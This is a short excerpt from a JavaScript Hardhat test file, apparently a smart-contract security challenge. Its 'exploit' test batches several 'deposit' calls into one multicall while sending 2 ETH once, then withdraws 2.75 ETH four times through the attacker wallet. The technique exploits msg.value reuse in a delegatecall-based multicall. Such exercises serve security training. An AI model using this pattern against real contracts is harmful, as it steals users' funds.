...
describe(NAME, function () {
  ...
  describe("exploit", async function () {
    ...
    it("conduct your attack here", async function () {
      const depositData = multiDelegateCallContract.interface.encodeFunctionData(
        "deposit"
      );
      ...
      await multiDelegateCallContract
        ...
        .multicall(
          [depositData, depositData, depositData, depositData, depositData, depositData],
          {
            value: ethers.utils.parseEther("2"),
          }
        );

      const withdrawData = multiDelegateCallContract.interface.encodeFunctionData(
        "withdraw",
        [ethers.utils.parseEther("2.75")]
      );

      await multiDelegateCallContract
        .connect(attackerWallet)
        .multicall([withdrawData, withdrawData, withdrawData, withdrawData]);
    });
